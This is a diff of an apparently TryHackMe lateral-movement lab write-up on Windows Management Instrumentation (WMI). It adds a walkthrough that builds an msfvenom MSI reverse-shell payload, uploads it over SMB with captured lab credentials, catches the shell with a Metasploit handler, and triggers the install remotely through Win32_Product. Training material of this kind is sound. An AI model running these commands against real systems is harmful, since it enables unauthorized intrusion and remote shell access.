@@ -13,8 +13,8 @@ $credential = New-Object System.Management.Automation.PSCredential $username, $s
 ```
 
 We then proceed to establish a WMI session using either of the following protocols:
-- **DCOM:** RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.
-- **Wsman:** WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).
+- ***DCOM*:** RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.
+- ***Wsman*:** WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).
 
 To establish a WMI session from Powershell, we can use the following commands and store the session on the `$Session` variable, which we will use throughout the room on the different techniques:
 ```powershell
@@ -118,9 +118,50 @@ wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Wind
 
 
 ## Example
-To complete this exercise, you will need to connect to THMJMP2 using the credentials assigned to you. Once you have your credentials, connect to THMJMP2 via SSH:
+To complete this exercise, you will need to connect to *THMJMP2* using the credentials assigned to you. Once you have your credentials, connect to *THMJMP2* via SSH:
 `ssh za\\<AD Username>@thmjmp2.za.tryhackme.com`
 
 For this exercise, we will assume we have already captured some credentials with administrative access:
 - **User:** ZA.TRYHACKME.COM\t1_corine.waters
 - **Password:** Korine.1994
+
+We'll show how to use those credentials to move laterally to THM-IIS using *WMI* and *MSI* packages. Feel free to try the other methods presented during this task.
+
+We will start by creating our *MSI* *payload* with msfvenom from our attacker machine:
+```shell-session
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST={lateralmovement} LPORT={4445} -f msi > {myinstaller.msi}
+```
+
+We then copy the payload using *SMB* or any other method available:
+```shell-session
+user@AttackBox$ smbclient -c 'put {myinstaller.msi}' -U {t1_corine.waters} -W ZA '{//thmiis.za.tryhackme.com/admin$/}' {Korine.1994}
+```
+
+Since we copied our payload to the *ADMIN$* share, it will be available at `C:\Windows\` on the server. 
+
+We start a handler to receive the reverse shell from Metasploit:
+```shell-session
+msf6 exploit(multi/handler) > set LHOST {lateralmovement}
+msf6 exploit(multi/handler) > set LPORT {4445}
+msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
+msf6 exploit(multi/handler) > exploit 
+```
+
+Let's start a *WMI* session against *THMIIS* from a Powershell console:
+
+THMJMP2: Powershell
+```shell-session
+PS C:\> $username = '{t1_corine.waters}';
+PS C:\> $password = '{Korine.1994}';
+PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
+PS C:\> $Session = New-Cimsession -ComputerName {thmiis.za.tryhackme.com} -Credential $credential -SessionOption $Opt -ErrorAction Stop
+```
+
+We then invoke the Install method from the *Win32_Produc*t class to trigger the payload:
+
+THMJMP2: Powershell
+```shell-session
+PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\{myinstaller.msi}"; Options = ""; AllUsers = $false}
+```
